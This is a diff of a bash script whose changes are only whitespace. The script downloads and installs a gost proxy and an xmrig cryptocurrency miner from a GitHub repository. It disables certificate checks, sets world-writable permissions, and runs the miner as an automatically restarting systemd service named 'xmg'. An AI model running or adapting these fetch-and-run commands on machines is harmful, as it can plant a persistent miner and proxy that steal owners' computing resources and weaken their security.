@@ -1,4 +1,4 @@
-#! /bin/bash
+#!/bin/bash
 
 function Install_Gost(){
   Installation_dependency
@@ -10,8 +10,6 @@ function Install_Gost(){
   mkdir /etc/gost && wget --no-check-certificate https://github.com/summaxx/myscript/raw/master/gostc.json && mv gostc.json /etc/gost/config.json && chmod -R 777 /etc/gost
   systemctl enable gost && systemctl restart gost
 }
-
-
 function Installation_dependency() {
   apt-get update -y
   gzip_ver=$(gzip -V)
@@ -26,7 +24,6 @@ function Installation_dependency() {
   fi
   apt-get install hwloc nodejs -y
 }
-
 function Install_XMRIG(){
   wget --no-check-certificate https://github.com/summaxx/myscript/raw/master/xmrig
   chmod 755 xmrig
@@ -35,7 +32,6 @@ function Install_XMRIG(){
   mv xmg.service /usr/lib/systemd/system
   systemctl enable xmg && systemctl restart xmg
 }
-
 
 Installation_dependency
 Install_Gost
